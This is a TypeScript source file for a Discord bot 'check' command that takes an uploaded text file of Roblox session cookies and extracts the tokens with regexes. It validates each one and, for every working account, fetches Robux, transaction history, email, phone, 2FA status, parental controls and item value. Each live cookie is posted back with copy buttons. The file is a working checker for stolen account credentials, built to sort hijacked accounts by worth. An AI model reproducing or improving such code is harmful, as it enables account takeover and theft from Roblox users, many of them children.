import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
  MessageFlags,
} from 'discord.js';
import axios from 'axios';
import * as Roblox from '../../lib/roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildProgressEmbed,
  buildBaseEmbed,
} from '../../lib/embed-helpers';
import { buildCopyButtons, handleCopyButtonClick } from '../../lib/button-helpers';
import { logger } from '../../lib/logger';
import type { Command } from './types';

const FULL_COOKIE_RE = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/g;
const BARE_COOKIE_RE = /CAEQ[A-Za-z0-9._\-+=\/]{50,}/g;

function extractCookies(text: string): string[] {
  const fullMatches = [...text.matchAll(FULL_COOKIE_RE)].map((m) => m[0]);
  const fullBareValues = new Set(fullMatches.map((m) => m.slice(m.indexOf('|_CAEQ') + 2)));
  const bareMatches = [...text.matchAll(BARE_COOKIE_RE)]
    .map((m) => m[0])
    .filter((v) => !fullBareValues.has(v));
  const seen = new Set<string>();
  const result: string[] = [];
  for (const full of fullMatches) {
    const bare = full.slice(full.indexOf('|_CAEQ') + 2);
    if (!seen.has(bare)) { seen.add(bare); result.push(full); }
  }
  for (const bare of bareMatches) {
    if (!seen.has(bare)) { seen.add(bare); result.push(bare); }
  }
  return result;
}

const data = new SlashCommandBuilder()
  .setName('check')
  .setDescription('Mass Checking File')
  .addAttachmentOption((opt) =>
    opt.setName('file')
      .setDescription('A .txt file containing cookies')
      .setRequired(true),
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const attachment = interaction.options.getAttachment('file', true);
    if (!attachment.name?.endsWith('.txt') && !attachment.contentType?.includes('text')) {
      const embed = buildErrorEmbed('✧ **Invalid File**\n────\n⭑ Please attach a `.txt` file.');
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    let fileContent: string;
    try {
      const resp = await axios.get<string>(attachment.url, { responseType: 'text', validateStatus: () => true });
      fileContent = resp.data;
    } catch (err: any) {
      logger.error({ err }, 'File download failed in check');
      const embed = buildErrorEmbed('✧ **Download Failed**\n────\n⭑ Could not fetch the file. Please try again.');
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const cookies = extractCookies(fileContent);
    if (cookies.length === 0) {
      const embed = buildErrorEmbed('✧ **No Cookies Found**\n────\n⭑ File must contain `_|WARNING...|_CAEQ…` or bare `CAEQ…` tokens.');
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const progressEmbed = buildProgressEmbed(`Scanning ${cookies.length} cookie(s)...`);
    await interaction.editReply({ embeds: [progressEmbed] });

    let validCount = 0;
    let totalRobux = 0;

    for (const rawCookie of cookies) {
      const validation = await Roblox.validateCookie(rawCookie);
      if (!validation.valid) continue;

      validCount++;
      const userId = validation.userId!;
      const age = await Roblox.getUserAge(userId);
      const robux = await Roblox.fetchRobux(rawCookie, String(userId));
      const summary = await Roblox.fetchTransactionTotals(rawCookie, String(userId));
      const country = await Roblox.fetchCountry(rawCookie);
      const email = await Roblox.fetchEmailInfo(rawCookie);
      const parental = await Roblox.fetchParentalControls(rawCookie);
      const thumb = await Roblox.fetchAvatarThumbnail(String(userId));
      const credit = await Roblox.fetchCreditBalance(rawCookie);
      const twoStep = await Roblox.fetchTwoStepConfig(rawCookie, String(userId));
      const phone = await Roblox.fetchPhoneInfo(rawCookie);
      const rap = await Roblox.fetchRolimonsRAP(String(userId));
      totalRobux += robux;

      let emailStatus = 'No email';
      if (email.verified) emailStatus = '✅ Verified';
      else if (email.pending) emailStatus = '⏳ Pending';

      const twoStepStatus = `📧 ${twoStep.email ? '✅' : '❌'} Email 2FA | 🔐 ${twoStep.authenticator ? '✅' : '❌'} Authenticator`;
      const phoneStatus = phone.hasPhone ? (phone.verified ? '✅ Verified' : '📱 Unverified') : '❌ No Phone';
      const balance = `${credit.balance} ${credit.currency}`;

      const id = Math.random().toString(36).slice(2, 10);
      const row = buildCopyButtons(id, 'check', rawCookie, false);

      const embed = buildAccountEmbed(
        validation.username!,
        validation.displayName || null,
        userId,
        age,
        robux,
        summary,
        country,
        emailStatus,
        parental.hasParent ? '✅ Linked' : '❌ None',
        thumb
      )
      .addFields(
        { name: '💰 Balance', value: balance, inline: true },
        { name: '📞 Phone', value: phoneStatus, inline: true },
        { name: '🔐 2FA', value: twoStepStatus, inline: false },
        { name: '📈 RAP', value: rap.rap !== null ? rap.rap.toLocaleString() : 'PRIVATE', inline: true },
        { name: '⭐ Premium', value: rap.premium ? '✅ Yes' : '❌ No', inline: true }
      );

      await interaction.followUp({ embeds: [embed], components: [row], flags: MessageFlags.Ephemeral });
    }

    const summaryEmbed = buildSuccessEmbed(
      validCount === 0
        ? `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** 0\n⭑ All are invalid or expired.`
        : `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** ${validCount}\n⭑ **Total Robux:** ${totalRobux.toLocaleString()}`
    );
    await interaction.followUp({ embeds: [summaryEmbed], flags: MessageFlags.Ephemeral });
  } catch (err: any) {
    logger.error({ err }, 'Check command error');
    await interaction.editReply({
      embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')],
    });
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  if (await handleCopyButtonClick(interaction)) return;
}

export const checkCommand: Command = { data, execute, handleButton };